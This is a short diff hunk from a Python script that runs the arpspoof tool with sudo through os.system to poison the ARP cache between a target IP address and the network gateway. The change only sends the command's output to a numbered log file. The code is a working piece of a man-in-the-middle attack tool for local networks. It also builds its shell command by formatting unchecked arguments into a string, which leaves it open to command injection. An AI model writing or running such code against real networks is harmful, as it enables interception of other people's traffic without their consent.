@@ -43,7 +43,7 @@ def get_neigh(iface,gw):
 
 def spoof(iface,ip,gw,i):
     try:
-        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {} ' """.format(iface,ip,gw,i)
+        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {} ' > log_{}.txt""".format(iface,ip,gw,i)
         os.system(spoof_cmd)
     except Exception as err:
         print(err)
